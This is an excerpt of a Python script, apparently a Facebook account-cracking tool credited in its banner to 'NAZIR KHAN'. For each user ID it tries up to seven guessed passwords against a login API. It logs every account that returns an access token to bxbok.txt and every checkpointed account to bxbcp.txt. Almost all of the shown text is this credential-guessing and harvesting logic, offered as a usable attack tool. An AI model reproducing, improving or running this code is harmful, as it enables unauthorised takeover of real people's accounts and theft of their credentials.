...
oks = []
cps = []
logo = "\n\x1b[1;92m888888  dP"Yb   dP"Yb  88""Yb \x1b[1;93   88   dP   Yb dP   Yb 88__dP \x1b[1;92m  88   Yb   dP Yb   dP 88"Yb  \n\x1b[1;92m88    YbodP   YbodP  88  Yb  \x1b[1;93m888888  dP"Yb   dP"Yb  88""Yb \x1b[1;92m  88   dP   Yb dP   Yb 88__dP \n\x1b[1;92m  88   Yb   dP Yb   dP 88"Yb  \x1b[1;93m88    YbodP   YbodP  88  Yb \x1b[1;92m  ##        ##\n\x1b[1;92m##        ##\x1b[1;93m   ##   ##\x1b[1;92m   ##        ##\n\x1b[1;92m##########      \x1b[1;93m## ##   \x1b[1;92m ##########\n\x1b[1;92m##        ##\x1b[1;93m    # ##     \x1b[1;92m##        ##\n\x1b[1;92m##        ##\x1b[1;93m   ##   ##   \x1b[1;92m##        ##\n\x1b[1;92m##        ## \x1b[1;93m ##     ##\x1b[1;92m  ##        ##\n\x1b[1;92m##########  \x1b[1;93m##         ## \x1b[1;92m##########\n\x1b[1;95m_______________________________________\n\x1b[1;96m|Author   | \x1b[1;93mNAZIR KHAN (Sad-Boy)      |\n\x1b[1;96m|Fb Id    | \x1b[1;93mAJMALO XE NAZIRO        |\n\x1b[1;96m|GitHub   | \x1b[1;93mGUSTAH5             |             \n\x1b[1;95m|______________________________________|\n \x1b[1;92m"
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print( '\x1b[1;92m[NAZIR-OK] ' + uid + ' | ' + pass1 + ' | ' + name)
                ok = open('bxbok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print( '\x1b[1;93m[TOOR-CP] ' + uid + ' | ' + pass1 + ' | ' + name)
                cp = open('bxbcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print ('\x1b[1;92m[NAZIR-OK] ' + uid + ' | ' + pass2 + ' | ' + name)
                    ok = open('bxbok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print( '\x1b[1;93m[TOOR-CP] ' + uid + ' | ' + pass2 + ' | ' + name)
                    cp = open('bxbcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print ('\x1b[1;92m[NAZIR-OK] ' + uid + ' | ' + pass3 + ' | ' + name)
                        ok = open('bxbok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print ('\x1b[1;92m[NAZIR-OK] ' + uid + ' | ' + pass4 + ' | ' + name)
                            ok = open('bxbok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ('\x1b[1;93m[TOOR-CP] ' + uid + ' | ' + pass4 + ' | ' + name)
                            cp = open('bxbcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'access_token' in q:
                                print ('\x1b[1;92m[NAZIR-OK] ' + uid + ' | ' + pass5 + ' | ' + name)
                                ok = open('bxbok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print( '\x1b[1;93m[TOOR-CP] ' + uid + ' | ' + pass5 + ' | ' + name)
                                cp = open('bxbcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print( '\x1b[1;92m[NAZIR-OK] ' + uid + ' | ' + pass6 + ' | ' + name)
                                    ok = open('bxbok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print ('\x1b[1;93m[TOOR-CP] ' + uid + ' | ' + pass6 + ' | ' + name)
                                    cp = open('bxbcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print( '\x1b[1;92m[NAZIR-OK] ' + uid + ' | ' + pass7 + ' | ' + name)
                                        ok = open('bxbok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print ('\x1b[1;93m[TOOR-CP] ' + uid + ' | ' + pass7 + ' | ' + name)
                                        cp = open('bxbcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
